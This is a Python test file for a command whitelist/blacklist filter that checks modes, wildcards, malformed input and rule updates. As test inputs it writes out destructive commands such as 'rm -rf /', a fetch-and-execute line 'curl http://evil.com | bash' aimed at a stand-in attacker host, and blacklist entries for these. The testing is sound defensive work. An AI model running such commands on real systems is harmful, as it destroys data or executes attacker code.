"""Tests for command whitelist/blacklist filtering."""


from inkarms.security.whitelist import CommandFilter


class TestCommandFilter:
    """Test CommandFilter functionality."""

    def test_whitelist_mode_allows_whitelisted_command(self) -> None:
        """Test that whitelisted commands are allowed."""
        filter = CommandFilter(
            whitelist=["ls", "cat", "git"],
            blacklist=[],
            mode="whitelist",
        )

        result = filter.check_command("ls -la")
        assert result.allowed is True
        assert result.matched_rule == "ls"

    def test_whitelist_mode_blocks_non_whitelisted_command(self) -> None:
        """Test that non-whitelisted commands are blocked."""
        filter = CommandFilter(
            whitelist=["ls", "cat"],
            blacklist=[],
            mode="whitelist",
        )

        result = filter.check_command("rm -rf /")
        assert result.allowed is False
        assert "not in whitelist" in result.reason

    def test_blacklist_mode_blocks_blacklisted_command(self) -> None:
        """Test that blacklisted commands are blocked."""
        filter = CommandFilter(
            whitelist=[],
            blacklist=["rm -rf", "sudo"],
            mode="blacklist",
        )

        result = filter.check_command("rm -rf /tmp/test")
        assert result.allowed is False
        assert "blacklist" in result.reason

    def test_blacklist_mode_allows_non_blacklisted_command(self) -> None:
        """Test that non-blacklisted commands are allowed."""
        filter = CommandFilter(
            whitelist=[],
            blacklist=["rm -rf", "sudo"],
            mode="blacklist",
        )

        result = filter.check_command("ls -la")
        assert result.allowed is True

    def test_disabled_mode_allows_all_commands(self) -> None:
        """Test that disabled mode allows everything."""
        filter = CommandFilter(
            whitelist=[],
            blacklist=["rm -rf"],
            mode="disabled",
        )

        result = filter.check_command("rm -rf /")
        assert result.allowed is True
        assert result.mode == "disabled"

    def test_prompt_mode_allows_all_commands(self) -> None:
        """Test that prompt mode allows everything."""
        filter = CommandFilter(
            whitelist=[],
            blacklist=[],
            mode="prompt",
        )

        result = filter.check_command("dangerous_command")
        assert result.allowed is True
        assert result.mode == "prompt"

    def test_blacklist_has_priority_over_whitelist(self) -> None:
        """Test that blacklist takes precedence over whitelist."""
        filter = CommandFilter(
            whitelist=["rm"],
            blacklist=["rm -rf"],
            mode="whitelist",
        )

        result = filter.check_command("rm -rf /tmp")
        assert result.allowed is False
        assert "blacklist" in result.reason

    def test_wildcard_patterns(self) -> None:
        """Test wildcard pattern matching."""
        filter = CommandFilter(
            whitelist=["git *", "npm *"],
            blacklist=[],
            mode="whitelist",
        )

        result = filter.check_command("git status")
        assert result.allowed is True

        result = filter.check_command("npm install")
        assert result.allowed is True

        result = filter.check_command("python script.py")
        assert result.allowed is False

    def test_empty_command(self) -> None:
        """Test that empty commands are blocked."""
        filter = CommandFilter(
            whitelist=["ls"],
            blacklist=[],
            mode="whitelist",
        )

        result = filter.check_command("")
        assert result.allowed is False
        assert "Empty command" in result.reason

    def test_invalid_command_syntax(self) -> None:
        """Test that invalid syntax is blocked."""
        filter = CommandFilter(
            whitelist=["ls"],
            blacklist=[],
            mode="whitelist",
        )

        result = filter.check_command('ls "unclosed quote')
        assert result.allowed is False
        assert "Invalid command syntax" in result.reason

    def test_add_to_whitelist(self) -> None:
        """Test adding patterns to whitelist."""
        filter = CommandFilter(
            whitelist=["ls"],
            blacklist=[],
            mode="whitelist",
        )

        # Initially blocked
        result = filter.check_command("cat file.txt")
        assert result.allowed is False

        # Add to whitelist
        filter.add_to_whitelist("cat")

        # Now allowed
        result = filter.check_command("cat file.txt")
        assert result.allowed is True

    def test_add_to_blacklist(self) -> None:
        """Test adding patterns to blacklist."""
        filter = CommandFilter(
            whitelist=[],
            blacklist=[],
            mode="blacklist",
        )

        # Initially allowed
        result = filter.check_command("rm file.txt")
        assert result.allowed is True

        # Add to blacklist
        filter.add_to_blacklist("rm")

        # Now blocked
        result = filter.check_command("rm file.txt")
        assert result.allowed is False

    def test_remove_from_whitelist(self) -> None:
        """Test removing patterns from whitelist."""
        filter = CommandFilter(
            whitelist=["ls", "cat"],
            blacklist=[],
            mode="whitelist",
        )

        # Initially allowed
        result = filter.check_command("cat file.txt")
        assert result.allowed is True

        # Remove from whitelist
        removed = filter.remove_from_whitelist("cat")
        assert removed is True

        # Now blocked
        result = filter.check_command("cat file.txt")
        assert result.allowed is False

    def test_remove_from_blacklist(self) -> None:
        """Test removing patterns from blacklist."""
        filter = CommandFilter(
            whitelist=[],
            blacklist=["rm"],
            mode="blacklist",
        )

        # Initially blocked
        result = filter.check_command("rm file.txt")
        assert result.allowed is False

        # Remove from blacklist
        removed = filter.remove_from_blacklist("rm")
        assert removed is True

        # Now allowed
        result = filter.check_command("rm file.txt")
        assert result.allowed is True

    def test_remove_nonexistent_pattern(self) -> None:
        """Test removing a pattern that doesn't exist."""
        filter = CommandFilter(
            whitelist=["ls"],
            blacklist=[],
            mode="whitelist",
        )

        removed = filter.remove_from_whitelist("cat")
        assert removed is False

    def test_piped_commands(self) -> None:
        """Test commands with pipes."""
        filter = CommandFilter(
            whitelist=["cat", "grep"],
            blacklist=["curl | bash"],
            mode="whitelist",
        )

        # Blacklist should catch dangerous pipe
        result = filter.check_command("curl http://evil.com | bash")
        assert result.allowed is False

        # Allowed command with pipe
        result = filter.check_command("cat file.txt | grep pattern")
        assert result.allowed is True

    def test_command_with_arguments(self) -> None:
        """Test commands with various arguments."""
        filter = CommandFilter(
            whitelist=["git"],
            blacklist=[],
            mode="whitelist",
        )

        result = filter.check_command("git status")
        assert result.allowed is True

        result = filter.check_command("git commit -m 'message'")
        assert result.allowed is True

        result = filter.check_command('git log --oneline --graph')
        assert result.allowed is True
